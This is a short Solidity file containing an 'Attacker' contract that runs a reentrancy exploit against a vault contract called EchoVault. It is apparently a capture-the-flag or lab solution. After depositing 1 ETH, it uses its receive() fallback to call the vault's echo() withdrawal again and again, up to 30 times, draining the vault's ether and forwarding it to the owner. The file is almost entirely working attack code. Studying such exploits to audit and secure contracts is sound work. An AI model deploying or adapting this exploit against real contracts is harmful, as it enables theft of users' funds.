// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEchoVault {
    function join() external payable;

    function echo() external;

    function getVaultBalance() external view returns (uint256);
}

contract Attacker {
    IEchoVault public vault;
    address public owner;

    uint256 public constant STEP = 0.5 ether;
    uint256 public counter;

    constructor(address _vault) {
        vault = IEchoVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Need exactly 1 ETH");

        vault.join{value: 1 ether}();
        vault.echo();

        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        counter++;

        if (address(vault).balance >= STEP && counter < 30) {
            vault.echo();
        }
    }
}
